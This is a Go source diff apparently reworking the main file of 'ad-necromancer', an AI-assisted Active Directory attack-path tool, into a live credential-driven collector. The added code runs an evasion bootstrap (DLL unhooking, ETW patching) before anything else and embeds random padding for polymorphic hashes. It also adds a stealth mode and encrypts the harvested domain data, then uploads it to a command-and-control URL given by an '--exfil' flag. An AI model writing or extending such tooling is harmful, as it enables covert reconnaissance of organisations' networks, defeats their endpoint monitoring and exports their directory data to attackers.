@@ -1,23 +1,33 @@
+//go:build windows
+
 package main
 
 import (
 	"flag"
 	"fmt"
 	"log"
+	"os"
 	"strings"
 
 	"ad-necromancer/internal/ai"
+	"ad-necromancer/internal/bh"
 	"ad-necromancer/internal/bloodhound"
 	"ad-necromancer/internal/claude"
+	"ad-necromancer/internal/collector"
+	"ad-necromancer/internal/crypto"
 	"ad-necromancer/internal/deepseek"
+	"ad-necromancer/internal/evasion"
+	"ad-necromancer/internal/exfil"
 	"ad-necromancer/internal/gemini"
 	"ad-necromancer/internal/necromancy"
 	"ad-necromancer/internal/ollama"
 	"ad-necromancer/internal/openai"
+	_ "ad-necromancer/internal/phantom" // embed random pad + BuildID for polymorphic hashing
 	"ad-necromancer/internal/privacy"
+	"ad-necromancer/internal/prompts"
 )
 
-// ANSI Color Codes for the "Ritual" theme
+// ANSI Color Codes
 const (
 	ColorReset  = "\033[0m"
 	ColorRed    = "\033[31m"
@@ -30,382 +40,350 @@ const (
 )
 
 func main() {
-	var dataDir string
-	var sampleSize int
-	var onPremise bool
-	var useOpenAI bool
-	var useGemini bool
-	var useClaude bool
-	var noPrivacyCloak bool
-	var saveMapping bool
-	var debugMode bool
+	// ---- Flags ----
+	var (
+		// Collection
+		username string
+		domain   string
+		password string
+		dc       string
+		method   string
 
-	flag.StringVar(&dataDir, "data", "", "Path to directory containing BloodHound JSON files")
-	flag.IntVar(&sampleSize, "sample-size", 20, "Max entities per type to send to LLM (users, groups, computers)")
-	flag.BoolVar(&onPremise, "on-premise", false, "Use local Ollama backend")
+		// Legacy: offline JSON analysis mode
+		dataDir    string
+		sampleSize int
+
+		// Output
+		localMode  bool
+		exfilURL   string
+
+		// Analysis (AI)
+		analyze     bool
+		useOpenAI   bool
+		useGemini   bool
+		useClaude   bool
+		onPremise   bool
+
+		// Evasion
+		stealth   bool
+		noUnhook  bool
+		noETWPatch bool
+
+		// Privacy
+		noPrivacyCloak bool
+		saveMapping    bool
+		debugMode      bool
+	)
+
+	// Collection flags
+	flag.StringVar(&username, "u", "", "AD username")
+	flag.StringVar(&username, "username", "", "AD username (long form)")
+	flag.StringVar(&domain, "d", "", "AD domain FQDN (e.g. corp.local)")
+	flag.StringVar(&domain, "domain", "", "AD domain FQDN (long form)")
+	flag.StringVar(&password, "p", "", "AD password")
+	flag.StringVar(&password, "password", "", "AD password (long form)")
+	flag.StringVar(&dc, "dc", "", "Domain controller hostname/IP (optional, auto-discovers)")
+	flag.StringVar(&method, "method", "auto", "Collection method: adws | ldap | auto")
+
+	// Legacy offline mode
+	flag.StringVar(&dataDir, "data", "", "Offline mode: path to BloodHound JSON files directory")
+	flag.IntVar(&sampleSize, "sample-size", 20, "AI entity sample size")
+
+	// Output flags
+	flag.BoolVar(&localMode, "local", true, "Save encrypted adn_data.zip locally")
+	flag.StringVar(&exfilURL, "exfil", "", "HTTPS C2 URL for encrypted zip upload")
+
+	// Analysis flags
+	flag.BoolVar(&analyze, "analyze", false, "Run AI necromancy analysis on collected data")
 	flag.BoolVar(&useOpenAI, "openai", false, "Use OpenAI backend")
-	flag.BoolVar(&useGemini, "gemini", false, "Use Google Gemini backend")
-	flag.BoolVar(&useClaude, "claude", false, "Use Anthropic Claude backend")
-	flag.BoolVar(&noPrivacyCloak, "no-privacy-cloak", false, "Disable privacy tokenization (send real data to AI)")
+	flag.BoolVar(&useGemini, "gemini", false, "Use Gemini backend")
+	flag.BoolVar(&useClaude, "claude", false, "Use Claude backend")
+	flag.BoolVar(&onPremise, "on-premise", false, "Use Ollama (local) backend")
+
+	// Evasion flags
+	flag.BoolVar(&stealth, "stealth", false, "Enable maximum evasion + minimal logging")
+	flag.BoolVar(&noUnhook, "no-unhook", false, "Disable DLL unhooking (debug)")
+	flag.BoolVar(&noETWPatch, "no-etw-patch", false, "Disable ETW patching (debug)")
+
+	// Privacy flags
+	flag.BoolVar(&noPrivacyCloak, "no-privacy-cloak", false, "Disable privacy tokenization")
 	flag.BoolVar(&saveMapping, "save-mapping", false, "Save tokenization mapping to disk")
-	flag.BoolVar(&debugMode, "debug", false, "Show actual payload sent to AI (verify Privacy Cloak)")
+	flag.BoolVar(&debugMode, "debug", false, "Show AI payload (verify Privacy Cloak)")
+
 	flag.Parse()
 
-	printBanner()
+	// ---- Phase 0: Evasion Bootstrap ----
+	// Run ASAP — before any network ops, any prints in stealth mode.
+	evasion.Bootstrap(noUnhook, noETWPatch)
 
-	if dataDir == "" {
-		log.Fatal(ColorRed + "[!] You must provide the location of the graveyard (--data <path/to/json>)" + ColorReset)
+	// ---- Banner ----
+	if !stealth {
+		printBannerV2()
 	}
 
-	// 1. Ingest Data
-	fmt.Println(ColorCyan + "\n[*] Exhuming artifacts from the directory..." + ColorReset)
-	loader := bloodhound.NewLoader()
-	if err := loader.LoadFromDirectory(dataDir); err != nil {
-		log.Fatalf(ColorRed+"[!] Failed to load data: %v"+ColorReset, err)
-	}
-	fmt.Printf(ColorGreen+"[+] Loaded: %d Users, %d Groups, %d Computers, %d Domains, %d GPOs, %d OUs, %d CertTemplates, %d EnterpriseCAs\n"+ColorReset,
-		len(loader.Data.Users), len(loader.Data.Groups), len(loader.Data.Computers),
-		len(loader.Data.Domains), len(loader.Data.GPOs), len(loader.Data.OUs),
-		len(loader.Data.CertTemplates), len(loader.Data.EnterpriseCAs))
+	// ---- Determine mode ----
+	offlineMode := dataDir != ""
+	liveMode := domain != "" && username != "" && password != ""
 
-	// 2. Initialize AI Backend
-	var client ai.AIClient
-	var err error
-
-	// Check for flag conflicts
-	flagCount := 0
-	if onPremise {
-		flagCount++
-	}
-	if useOpenAI {
-		flagCount++
-	}
-	if useGemini {
-		flagCount++
-	}
-	if useClaude {
-		flagCount++
+	if !offlineMode && !liveMode {
+		if !stealth {
+			fmt.Println(ColorRed + "[!] Provide credentials (-u/-d/-p) for live collection, or --data for offline analysis." + ColorReset)
+		}
+		flag.Usage()
+		os.Exit(1)
 	}
 
-	if flagCount > 1 {
-		fmt.Println(ColorYellow + "[!] Multiple AI backends specified. Using priority: Ollama > Claude > Gemini > OpenAI > DeepSeek" + ColorReset)
+	// ---- Phase 1: Data Collection ----
+	var adData *bh.ADData
+
+	if liveMode {
+		if !stealth {
+			fmt.Printf(ColorCyan+"[*] Target: %s@%s\n"+ColorReset, username, domain)
+			fmt.Printf(ColorCyan+"[*] Method: %s\n"+ColorReset, strings.ToUpper(method))
+		}
+
+		cfg := collector.Config{
+			Domain:   domain,
+			DC:       dc,
+			Username: username,
+			Password: password,
+			Method:   collector.Method(method),
+			Stealth:  stealth,
+		}
+
+		var err error
+		adData, err = collector.Collect(cfg)
+		if err != nil {
+			log.Fatalf(ColorRed+"[!] Collection failed: %v"+ColorReset, err)
+		}
+
+		if !stealth {
+			fmt.Printf(ColorGreen+"[+] Collected: %d Users, %d Groups, %d Computers, %d Domains, %d GPOs, %d OUs, %d CertTemplates, %d EnterpriseCAs\n"+ColorReset,
+				len(adData.Users), len(adData.Groups), len(adData.Computers),
+				len(adData.Domains), len(adData.GPOs), len(adData.OUs),
+				len(adData.CertTemplates), len(adData.EnterpriseCAs))
+		}
+
+		// ---- Phase 2: Format to BloodHound CE v6 JSON ----
+		formatter := bh.NewFormatter(adData)
+		files, err := formatter.FormatAll()
+		if err != nil {
+			log.Fatalf(ColorRed+"[!] BH format failed: %v"+ColorReset, err)
+		}
+
+		// ---- Phase 3: AES-256-GCM Encrypt + Zip ----
+		ez, err := crypto.BuildEncryptedZip(files)
+		if err != nil {
+			log.Fatalf(ColorRed+"[!] Crypto failed: %v"+ColorReset, err)
+		}
+
+		// ---- Phase 4: Exfil ----
+		if localMode {
+			if err := exfil.SaveLocal(ez, "adn_data.zip"); err != nil {
+				log.Fatalf(ColorRed+"[!] Save failed: %v"+ColorReset, err)
+			}
+			if !stealth {
+				fmt.Println(ColorGreen + "[+] Saved: adn_data.zip (AES-256-GCM encrypted)" + ColorReset)
+				fmt.Printf(ColorYellow+"[🔑] Decryption key: %s\n"+ColorReset, ez.KeyHex())
+				fmt.Println(ColorYellow + "[!] Store this key securely — it will NOT be logged or saved automatically." + ColorReset)
+			}
+		}
+
+		if exfilURL != "" {
+			if !stealth {
+				fmt.Printf(ColorCyan+"[*] Uploading to C2: %s\n"+ColorReset, exfilURL)
+			}
+			if err := exfil.UploadHTTPS(ez, exfilURL); err != nil {
+				if !stealth {
+					fmt.Printf(ColorYellow+"[!] Exfil failed: %v\n"+ColorReset, err)
+				}
+			} else if !stealth {
+				fmt.Println(ColorGreen + "[+] Exfil complete." + ColorReset)
+			}
+		}
 	}
 
-	// Select backend based on flags (priority order)
-	if onPremise {
-		fmt.Println(ColorCyan + "[*] Using Ollama (on-premise) backend..." + ColorReset)
-		client, err = ollama.NewClient()
-	} else if useClaude {
-		fmt.Println(ColorCyan + "[*] Using Anthropic Claude backend..." + ColorReset)
-		client, err = claude.NewClient()
-	} else if useGemini {
-		fmt.Println(ColorCyan + "[*] Using Google Gemini backend..." + ColorReset)
-		client, err = gemini.NewClient()
-	} else if useOpenAI {
-		fmt.Println(ColorCyan + "[*] Using OpenAI backend..." + ColorReset)
-		client, err = openai.NewClient()
-	} else {
-		fmt.Println(ColorCyan + "[*] Using DeepSeek backend (default)..." + ColorReset)
-		client, err = deepseek.NewClient()
-	}
+	// ---- Phase 5: AI Necromancy Analysis (optional --analyze flag) ----
+	if analyze {
+		if !stealth {
+			fmt.Println(ColorPurple + "\n[*] Initiating Necromancy ritual..." + ColorReset)
+		}
 
-	if err != nil {
-		log.Fatalf(ColorRed+"[!] The connection to the void failed: %v"+ColorReset, err)
-	}
+		// Build the old bloodhound.Loader-compatible data from adData or offline files
+		var loader *bloodhound.Loader
+		if offlineMode {
+			loader = bloodhound.NewLoader()
+			if err := loader.LoadFromDirectory(dataDir); err != nil {
+				log.Fatalf(ColorRed+"[!] Failed to load data: %v"+ColorReset, err)
+			}
+		} else if adData != nil {
+			// Convert collected bh.ADData back to bloodhound.BloodHoundData for the existing engine
+			loader = adDataToLoader(adData)
+		}
 
-	// 2.5. Initialize Privacy Cloak
-	var tokenizer *privacy.Tokenizer
-	var cloakEnabled bool
-	var runID string
-
-	// Determine if Privacy Cloak should be enabled
-	// Default: ON for remote AI (DeepSeek/OpenAI), OFF for on-premise (Ollama)
-	if noPrivacyCloak {
-		cloakEnabled = false
-	} else if onPremise {
-		cloakEnabled = false // On-premise = data stays local, no need for cloak
-	} else {
-		cloakEnabled = true // Remote AI = enable cloak by default
-	}
-
-	if cloakEnabled {
-		tokenizer = privacy.NewTokenizer()
-		runID = privacy.GenerateRunID()
-		fmt.Println(ColorGreen + "[🔒] Privacy Cloak: ENABLED (tokenized remote AI)" + ColorReset)
-	} else {
+		// Initialize AI backend
+		var aiClient ai.AIClient
+		var err error
 		if onPremise {
-			fmt.Println(ColorCyan + "[*] Privacy Cloak: DISABLED (on-premise AI)" + ColorReset)
+			aiClient, err = ollama.NewClient()
+		} else if useClaude {
+			aiClient, err = claude.NewClient()
+		} else if useGemini {
+			aiClient, err = gemini.NewClient()
+		} else if useOpenAI {
+			aiClient, err = openai.NewClient()
 		} else {
-			fmt.Println(ColorYellow + "[!] Privacy Cloak: DISABLED (sending real data to remote AI)" + ColorReset)
+			aiClient, err = deepseek.NewClient()
+		}
+		if err != nil {
+			log.Fatalf(ColorRed+"[!] AI backend init failed: %v"+ColorReset, err)
+		}
+
+		// Privacy cloak
+		var tokenizer *privacy.Tokenizer
+		cloakEnabled := !noPrivacyCloak && !onPremise
+		if cloakEnabled {
+			tokenizer = privacy.NewTokenizer()
+			if !stealth {
+				fmt.Println(ColorGreen + "[🔒] Privacy Cloak: ENABLED" + ColorReset)
+			}
+		}
+
+		engine := necromancy.NewEngine(loader, aiClient)
+		engine.Tokenizer = tokenizer
+		engine.CloakEnabled = cloakEnabled
+		engine.DebugMode = debugMode
+
+		paths, err := engine.ResurrectWithSampleSize(sampleSize)
+		if err != nil {
+			log.Fatalf(ColorRed+"[!] Necromancy failed: %v"+ColorReset, err)
+		}
+
+		if !stealth {
+			printPaths(paths)
+		}
+
+		// Save prompt used for reference
+		_ = prompts.NecromancerSystemPrompt
+
+		// Save mapping if requested
+		if saveMapping && cloakEnabled && tokenizer != nil {
+			runID := privacy.GenerateRunID()
+			if err := tokenizer.SaveMapping(runID); err != nil {
+				fmt.Printf(ColorYellow+"[!] Failed to save mapping: %v\n"+ColorReset, err)
+			}
 		}
 	}
 
-	// 3. Begin Ritual
-	fmt.Println(ColorPurple + "\n[*] Disturbing dormant identities..." + ColorReset)
-	fmt.Println(ColorPurple + "[*] Listening for forgotten control..." + ColorReset)
-	fmt.Println(ColorPurple + "[*] Resurrecting dead privileges..." + ColorReset)
-	fmt.Println(ColorCyan + "[*] Using intelligent sampling (prioritizing high-value targets)..." + ColorReset)
-	fmt.Println()
-
-	engine := necromancy.NewEngine(loader, client)
-	engine.Tokenizer = tokenizer
-	engine.CloakEnabled = cloakEnabled
-	engine.DebugMode = debugMode
-
-	paths, err := engine.ResurrectWithSampleSize(sampleSize)
-	if err != nil {
-		log.Fatalf(ColorRed+"[!] The ritual was interrupted: %v"+ColorReset, err)
-	}
-
-	// 4. Reveal Undead Paths
-	fmt.Println()
-
-	// Count risks for summary
-	riskCounts := make(map[string]int)
-
-	for _, p := range paths {
-		// Determine color based on risk level
-		riskColor := ColorGreen
-		riskIcon := "ℹ️"
-		switch p.Probability {
-		case "Critical":
-			riskColor = ColorRed
-			riskIcon = "CRITICAL"
-		case "High":
-			riskColor = ColorOrange
-			riskIcon = "HIGH"
-		case "Medium":
-			riskColor = ColorYellow
-			riskIcon = "MEDIUM"
-		case "Low":
-			riskColor = ColorGreen
-			riskIcon = "LOW"
-		}
-		riskCounts[p.Probability]++
-
-		// Print dramatic header
-		fmt.Println(ColorRed + "╔══════════════════════════════════════════════════════════════════════════════╗" + ColorReset)
-		fmt.Printf(ColorRed+"║%s☠ UNDEAD CONTROL PATH RESURRECTED — %s%s%-*s%s║\n"+ColorReset,
-			" ", riskColor, riskIcon, 48-len(riskIcon), " ", ColorRed)
-		fmt.Println(ColorRed + "╚══════════════════════════════════════════════════════════════════════════════╝" + ColorReset)
-		fmt.Println()
-
-		// [ENTITY] Section
-		if p.EntityName != "" || p.EntityType != "" {
-			fmt.Println(ColorCyan + "[ENTITY]" + ColorReset)
-			if p.EntityName != "" {
-				fmt.Printf("  Name   : %s%s%s\n", ColorPurple, p.EntityName, ColorReset)
-			}
-			if p.EntityType != "" {
-				fmt.Printf("  Type   : %s\n", p.EntityType)
-			}
-			if p.EntityStatus != "" {
-				fmt.Printf("  Status : %s%s%s\n", ColorRed, p.EntityStatus, ColorReset)
-			}
-			if p.EntityOrigin != "" {
-				fmt.Printf("  Origin : %s\n", p.EntityOrigin)
-			}
-			fmt.Println()
-		}
-
-		// [SECURITY INTERPRETATION] Section
-		if p.Reasoning != "" {
-			fmt.Println(ColorCyan + "[SECURITY INTERPRETATION]" + ColorReset)
-			// Split reasoning into bullet points if it contains multiple sentences
-			reasoningLines := splitIntoBullets(p.Reasoning)
-			for _, line := range reasoningLines {
-				fmt.Printf("  ▸ %s\n", line)
-			}
-			fmt.Println()
-		}
-
-		// [CONFIDENCE] Section
-		if p.Confidence != "" {
-			confidenceColor := ColorGreen
-			if strings.Contains(p.Confidence, "HIGH") {
-				confidenceColor = ColorRed
-			} else if strings.Contains(p.Confidence, "MEDIUM") {
-				confidenceColor = ColorYellow
-			}
-			fmt.Printf(ColorCyan+"[CONFIDENCE]"+ColorReset+" %s%s%s\n\n", confidenceColor, p.Confidence, ColorReset)
-		}
-
-		// [UNDEAD CONTROL PATH] Section - Visual Graph
-		if p.VisualPath != "" {
-			fmt.Println(ColorCyan + "[UNDEAD CONTROL PATH]" + ColorReset)
-			fmt.Println()
-			fmt.Println(p.VisualPath)
-			fmt.Println()
-		}
-
-		// [HUMAN BLIND SPOT] Section
-		if len(p.HumanBlindSpot) > 0 {
-			fmt.Println(ColorYellow + "[HUMAN BLIND SPOT]" + ColorReset)
-			for _, blindspot := range p.HumanBlindSpot {
-				fmt.Printf("  ▸ %s\n", blindspot)
-			}
-			fmt.Println()
-		}
-
-		// [IMPACT] Section
-		if len(p.Impact) > 0 {
-			fmt.Println(ColorRed + "[IMPACT]" + ColorReset)
-			for _, impact := range p.Impact {
-				fmt.Printf("  %s\n", impact)
-			}
-			fmt.Println()
-		}
-
-		// [WHY THIS EXISTS] Section
-		if p.WhyThisExists != "" {
-			fmt.Println(ColorPurple + "[WHY THIS EXISTS]" + ColorReset)
-			fmt.Printf("  %s%s%s\n", ColorBold, p.WhyThisExists, ColorReset)
-			fmt.Println()
-		}
-
-		// [EXECUTION VECTORS] Section (if present, but de-emphasized)
-		if len(p.ExecutionVectors) > 0 {
-			fmt.Println(ColorCyan + "[EXECUTION VECTORS]" + ColorReset)
-			for _, vector := range p.ExecutionVectors {
-				fmt.Printf("  • %s\n", vector)
-			}
-			fmt.Println()
-		}
-
-		// [DETECTION] Section
-		if len(p.DetectionRules) > 0 {
-			fmt.Println(ColorGreen + "[DETECTION RULES]" + ColorReset)
-			for _, rule := range p.DetectionRules {
-				fmt.Printf("  • %s\n", rule)
-			}
-			fmt.Println()
-		}
-
-		// [MITIGATION] Section
-		if p.Mitigation != "" {
-			fmt.Println(ColorGreen + "[MITIGATION]" + ColorReset)
-			fmt.Printf("  %s\n", p.Mitigation)
-			fmt.Println()
-		}
-
-		// [MITRE ATT&CK MAPPING] Section (minimal, at the end)
-		if len(p.MitreAttack) > 0 {
-			fmt.Println(ColorCyan + "[MITRE ATT&CK MAPPING]" + ColorReset)
-			for _, technique := range p.MitreAttack {
-				fmt.Printf("  ▸ %s\n", technique)
-			}
-			fmt.Println()
-		}
-
-		// Legacy fallback support
-		if p.ResurrectedChain != "" {
-			fmt.Println(ColorRed + "[RESURRECTED CHAIN]" + ColorReset)
-			fmt.Printf("  %s\n", p.ResurrectedChain)
-			fmt.Println()
-		} else if p.ExploitChain != "" {
-			fmt.Println(ColorRed + "[RESURRECTED CHAIN]" + ColorReset)
-			fmt.Printf("  %s\n", p.ExploitChain)
-			fmt.Println()
-		}
-
-		fmt.Println(ColorCyan + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" + ColorReset)
-		fmt.Println()
-	}
-
-	// Print summary
-	fmt.Println(ColorPurple + "╔══════════════════════════════════════════════════════════════════════════════╗" + ColorReset)
-	fmt.Println(ColorPurple + "║                           RESURRECTION COMPLETE                              ║" + ColorReset)
-	fmt.Println(ColorPurple + "╚══════════════════════════════════════════════════════════════════════════════╝" + ColorReset)
-	fmt.Println()
-
-	fmt.Printf(ColorGreen+"[✓] Total Undead Paths Discovered: %d\n\n"+ColorReset, len(paths))
-
-	// Show risk breakdown
-	hasHighRisk := false
-	if riskCounts["Critical"] > 0 {
-		fmt.Println(ColorRed + "    ╔══════════════════════════════════════════════════════════════════════════╗" + ColorReset)
-		fmt.Printf(ColorRed+"    ║  🔴 CRITICAL RISK: %d path(s) - IMMEDIATE ACTION REQUIRED!              ║\n"+ColorReset, riskCounts["Critical"])
-		fmt.Println(ColorRed + "    ╚══════════════════════════════════════════════════════════════════════════╝" + ColorReset)
-		hasHighRisk = true
-	}
-	if riskCounts["High"] > 0 {
-		fmt.Printf(ColorOrange+"    🟠 High Risk: %d path(s) - Prioritize remediation\n"+ColorReset, riskCounts["High"])
-		hasHighRisk = true
-	}
-	if riskCounts["Medium"] > 0 {
-		fmt.Printf(ColorYellow+"    🟡 Medium Risk: %d path(s) - Schedule for review\n"+ColorReset, riskCounts["Medium"])
-	}
-	if riskCounts["Low"] > 0 {
-		fmt.Printf(ColorGreen+"    🟢 Low Risk: %d path(s) - Monitor and track\n"+ColorReset, riskCounts["Low"])
-	}
-
-	fmt.Println()
-	if hasHighRisk {
-		fmt.Println(ColorRed + "    ⚠️  WARNING: Critical/High risk findings detected!" + ColorReset)
-		fmt.Println(ColorRed + "    ⚠️  These forgotten identities could lead to FULL DOMAIN COMPROMISE!" + ColorReset)
-		fmt.Println()
-	}
-
-	fmt.Println(ColorPurple + "    💀 The dead have spoken. Will you listen?" + ColorReset)
-	fmt.Println()
-
-	// 5. Save mapping if requested
-	if saveMapping && cloakEnabled && tokenizer != nil {
-		if err := tokenizer.SaveMapping(runID); err != nil {
-			fmt.Printf(ColorYellow+"[!] Failed to save mapping: %v\n"+ColorReset, err)
-		} else {
-			fmt.Printf(ColorGreen+"[✓] Mapping saved to .necromancer/mappings/run_%s.json\n"+ColorReset, runID)
-			fmt.Println(ColorYellow + "[!] WARNING: Mapping file contains sensitive data. Protect it like credentials." + ColorReset)
-		}
+	if !stealth {
+		fmt.Println(ColorPurple + "\n[💀] The dead have spoken." + ColorReset)
 	}
 }
 
-func printBanner() {
+// adDataToLoader converts collected bh.ADData into a bloodhound.Loader for the AI engine.
+func adDataToLoader(data *bh.ADData) *bloodhound.Loader {
+	loader := bloodhound.NewLoader()
+
+	toNodes := func(nodes []bh.Node) []bloodhound.Node {
+		out := make([]bloodhound.Node, 0, len(nodes))
+		for _, n := range nodes {
+			out = append(out, bloodhound.Node{
+				ObjectIdentifier: n.ObjectIdentifier,
+				Properties: bloodhound.Properties{
+					Name:              n.Properties.Name,
+					Domain:            n.Properties.Domain,
+					Description:       n.Properties.Description,
+					DistinguishedName: n.Properties.DistinguishedName,
+					HighValue:         n.Properties.HighValue,
+					AdminCount:        n.Properties.AdminCount,
+					Enabled:           n.Properties.Enabled,
+					PasswordLastSet:   n.Properties.PasswordLastSet,
+					OperatingSystem:   n.Properties.OperatingSystem,
+				},
+			})
+		}
+		return out
+	}
+
+	loader.Data.Users = toNodes(data.Users)
+	loader.Data.Groups = toNodes(data.Groups)
+	loader.Data.Computers = toNodes(data.Computers)
+	loader.Data.Domains = toNodes(data.Domains)
+	loader.Data.GPOs = toNodes(data.GPOs)
+	loader.Data.OUs = toNodes(data.OUs)
+	loader.Data.CertTemplates = toNodes(data.CertTemplates)
+	loader.Data.EnterpriseCAs = toNodes(data.EnterpriseCAs)
+
+	return loader
+}
+
+func printBannerV2() {
 	banner := `
-    ___    ____  _   __                                                    
-   /   |  / __ \/ | / /__  ______________  ____ ___  ____ _____  ________  _____
-  / /| | / / / /  |/ / _ \/ ___/ ___/ __ \/ __  __ \/ __  / __ \/ ___/ _ \/ ___/
- / ___ |/ /_/ / /|  /  __/ /__/ /  / /_/ / / / / / / /_/ / / / / /__/  __/ /    
-/_/  |_/_____/_/ |_/\___/\___/_/   \____/_/ /_/ /_/\__,_/_/ /_/\___/\___/_/     
-                                                                                
-             "Humans forget. Directories do not."
+  ███╗   ██╗███████╗ ██████╗██████╗  ██████╗ ███╗   ███╗ █████╗ ███╗   ██╗ ██████╗███████╗██████╗     ██╗   ██╗██████╗ 
+  ████╗  ██║██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗ ████║██╔══██╗████╗  ██║██╔════╝██╔════╝██╔══██╗    ██║   ██║╚════██╗
+  ██╔██╗ ██║█████╗  ██║     ██████╔╝██║   ██║██╔████╔██║███████║██╔██╗ ██║██║     █████╗  ██████╔╝    ██║   ██║ █████╔╝
+  ██║╚██╗██║██╔══╝  ██║     ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║     ██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██╔═══╝ 
+  ██║ ╚████║███████╗╚██████╗██║  ██║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║ ╚████║╚██████╗███████╗██║  ██║     ╚████╔╝ ███████╗
+  ╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚══════╝
+                                                                    [ v2 — Privilege Archaeology Engine ]
+                                             "Humans forget. Directories do not."
 `
 	fmt.Println(ColorRed + banner + ColorReset)
 }
 
-// splitIntoBullets splits text into bullet points (by sentence or newline)
-func splitIntoBullets(text string) []string {
-	// First try splitting by newlines
+func printPaths(paths []necromancy.ZombiePath) {
+	for _, p := range paths {
+		riskColor := ColorGreen
+		switch p.Probability {
+		case "Critical":
+			riskColor = ColorRed
+		case "High":
+			riskColor = ColorOrange
+		case "Medium":
+			riskColor = ColorYellow
+		}
+		fmt.Println(ColorRed + "╔══════════════════════════════════════════════════════════════════════════════╗" + ColorReset)
+		fmt.Printf(ColorRed+"║ %s☠  %-74s%s║\n"+ColorReset, riskColor, p.Probability+" — "+p.Title, ColorRed)
+		fmt.Println(ColorRed + "╚══════════════════════════════════════════════════════════════════════════════╝" + ColorReset)
+
+		if p.EntityName != "" {
+			fmt.Printf(ColorCyan+"[ENTITY]"+ColorReset+" %s%s%s (%s)\n", ColorPurple, p.EntityName, ColorReset, p.EntityType)
+		}
+		if p.Reasoning != "" {
+			fmt.Println(ColorCyan + "[SECURITY INTERPRETATION]" + ColorReset)
+			for _, line := range splitBullets(p.Reasoning) {
+				fmt.Printf("  ▸ %s\n", line)
+			}
+		}
+		if p.VisualPath != "" {
+			fmt.Println(ColorCyan + "[UNDEAD CONTROL PATH]" + ColorReset)
+			fmt.Println(p.VisualPath)
+		}
+		if len(p.ExecutionVectors) > 0 {
+			fmt.Println(ColorCyan + "[EXECUTION VECTORS]" + ColorReset)
+			for _, v := range p.ExecutionVectors {
+				fmt.Printf("  • %s\n", v)
+			}
+		}
+		if p.Mitigation != "" {
+			fmt.Println(ColorGreen + "[MITIGATION]" + ColorReset)
+			fmt.Printf("  %s\n", p.Mitigation)
+		}
+		fmt.Println(ColorCyan + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" + ColorReset)
+		fmt.Println()
+	}
+}
+
+func splitBullets(text string) []string {
 	if strings.Contains(text, "\n") {
-		lines := strings.Split(text, "\n")
-		var result []string
-		for _, line := range lines {
-			line = strings.TrimSpace(line)
-			if line != "" {
-				result = append(result, line)
+		var out []string
+		for _, l := range strings.Split(text, "\n") {
+			l = strings.TrimSpace(l)
+			if l != "" {
+				out = append(out, l)
 			}
 		}
-		if len(result) > 0 {
-			return result
-		}
+		return out
 	}
-
-	// Otherwise split by sentences
-	sentences := strings.Split(text, ". ")
-	var result []string
-	for i, sentence := range sentences {
-		sentence = strings.TrimSpace(sentence)
-		if sentence != "" {
-			// Add period back if not last sentence
-			if i < len(sentences)-1 && !strings.HasSuffix(sentence, ".") {
-				sentence += "."
-			}
-			result = append(result, sentence)
-		}
-	}
-
-	if len(result) == 0 {
-		return []string{text}
-	}
-	return result
+	return []string{text}
 }
